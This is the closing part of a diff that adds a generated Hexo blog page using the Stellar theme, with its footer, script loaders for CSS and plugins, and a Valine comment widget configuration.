+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
